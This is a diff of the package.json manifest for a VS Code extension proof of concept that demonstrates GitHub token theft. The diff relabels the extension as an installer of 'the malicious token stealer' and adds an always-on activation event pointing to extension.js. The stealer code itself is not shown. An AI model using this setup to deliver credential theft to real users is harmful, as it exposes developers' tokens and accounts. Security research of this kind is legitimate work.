@@ -1,12 +1,14 @@
 {
-  "name": "token-steal-poc",
-  "displayName": "Github Token Steal PoC Extension",
-  "description": "VS Code local workspace extension to demonstrate GitHub token stealing.",
+  "name": "token-steal-poc-local-installer",
+  "displayName": "Token Steal PoC Local Installer",
+  "description": "Installs the malicious token stealer",
   "version": "0.0.1",
   "publisher": "Ammar",
   "engines": {
-    "vscode": "^0.0.0"
+    "vscode": "^1.85.0"
   },
+  "activationEvents": ["*"],
+  "main": "./extension.js",
   "contributes": {
     "keybindings": [
       {
